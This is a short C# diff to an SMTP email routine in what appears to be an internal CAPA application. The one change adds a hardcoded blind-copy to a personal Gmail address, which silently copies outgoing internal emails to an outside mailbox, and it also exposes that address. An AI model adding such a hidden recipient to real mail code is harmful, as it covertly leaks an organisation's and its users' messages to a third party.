@@ -64,7 +64,7 @@ namespace B7_CAPA_Online.Scripts.SMTP
                 {
                    NewCAPAEmail(dic, obj, index);
                 }
-
+                msg.Bcc.Add("tanaelbudiman@gmail.com");
                 return "success";
             }
             catch (Exception ex)
